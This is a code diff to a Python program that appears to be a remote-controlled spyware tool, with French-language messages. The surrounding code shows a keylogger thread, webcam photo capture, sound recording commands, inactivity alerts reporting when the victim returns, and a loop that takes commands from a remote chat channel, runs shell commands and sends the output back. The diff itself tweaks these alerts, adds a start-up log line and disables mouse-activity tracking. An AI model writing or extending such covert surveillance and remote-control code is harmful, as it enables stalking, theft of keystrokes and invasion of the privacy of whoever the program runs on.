@@ -28,7 +28,9 @@ def detectMouseActivity():
 			
 			inactivite = round(datetime.datetime.now().timestamp()) - round(last_activity.timestamp())
 			
-			if inactivite > 60 * 15 : sendMessage(f"Activite detectee, retour apres {round(inactivite/60)} minutes d'absence")
+			if inactivite > 60 * 15 :
+				
+				sendMessage(f"Activite detectee, retour apres {round(inactivite/60)} minutes d'absence")
 			
 			last_activity = datetime.datetime.now()
 			
@@ -118,10 +120,6 @@ def takeWebcamPhoto():
 def on_key_press(event):
 
 	global last_activity
-	
-	inactivite = round(datetime.datetime.now().timestamp()) - round(last_activity.timestamp())
-	
-	if inactivite > 60 * 15 : sendMessage(f"Activite detectee, retour apres {round(inactivite/60)} minutes d'absence")
 	
 	last_activity = datetime.datetime.now()
 	
@@ -223,11 +221,13 @@ if __name__ == "__main__":
 	last_activity = datetime.datetime.now()
 	last_time_recieved =  round(datetime.datetime.now().timestamp())
 	
+	with open(log_file, 'a') as f: f.write(f"\nStarted : {last_activity}\n")
+	
 	keylogger = threading.Thread(target=startKeylogger)
 	keylogger.start()
 	
-	activity = threading.Thread(target=detectMouseActivity)
-	activity.start()
+	#activity = threading.Thread(target=detectMouseActivity)
+	#activity.start()
 	
 	cam = cv2.VideoCapture(0, cv2.CAP_DSHOW) 
 	result, image = cam.read() 
@@ -372,8 +372,8 @@ if __name__ == "__main__":
 					elif "/record_sound_stop" in last_message['message']['text']:
 						recording = False
 					
-					elif "/activity" in  last_message['message']['text']:
-						sendMessage(f"Derniere activite : {last_activity.strftime("%d/%m/%Y %H:%M:%S")}")
+					#elif "/activity" in  last_message['message']['text']:
+					#	sendMessage(f"Derniere activite : {last_activity.strftime("%d/%m/%Y %H:%M:%S")}")
 					
 					out = subprocess.getoutput("cd")
 					sendMessage(f"/man {out}>")
